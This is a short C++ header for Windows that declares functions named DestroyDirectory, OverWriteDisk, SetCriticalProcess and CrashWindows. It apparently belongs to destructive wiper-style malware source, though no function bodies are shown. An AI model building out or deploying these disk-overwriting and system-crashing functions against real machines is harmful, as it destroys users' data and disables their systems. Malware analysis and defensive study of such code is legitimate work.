#pragma once
#include <Windows.h>
#include <AclAPI.h>
#include <windows.h>
#include <winternl.h>
#include <Psapi.h>
#include <shlobj.h>
#include <tlhelp32.h> 


// Define the custom error code
#define MY_ERROR_CODE 0xDEADBEEF
using namespace std;

extern void DestroyDirectory(LPWSTR Directory);
extern void OverWriteDisk();
extern void SetCriticalProcess();
extern void CrashWindows();
extern void CrashWindowswithbeef();